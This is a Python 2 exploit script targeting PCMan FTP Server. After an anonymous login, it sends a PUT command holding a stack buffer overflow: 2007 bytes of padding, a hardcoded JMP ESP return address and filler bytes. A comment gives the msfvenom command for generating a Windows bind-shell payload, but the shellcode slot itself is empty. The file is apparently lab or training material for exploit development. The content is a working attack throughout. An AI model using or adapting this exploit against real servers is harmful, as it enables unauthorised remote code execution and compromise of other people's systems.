#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
pcman FTP Server Exploit - Offset & JMP ESP
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
#shellcode = ()

#EIP = 43396f43 -> offset at 2007
offset = 'A'*2007

#JMP ESP = !mona jmp -r esp -> 0x77c35459 or \x59\x54\xc3\x77
nowjump = '\x59\x54\xc3\x77'

#bufferandshellcode
sploit = offset + nowjump + 'C'*(2500-len(offset+nowjump))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print "\nDestroy them with lazers..."
	s.connect(('172.16.73.129',21))
	s.recv(1024)
	s.send('USER anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')
	s.recv(1024)
	s.send('PUT ' + sploit + '\r\n\n')
	s.recv(1024)
	s.send('QUIT\r\n')
	s.close
	print "\nFire in the hole! Go pick up the pieces!"
except:
	print "ERROR! Shutting it dooooown.."
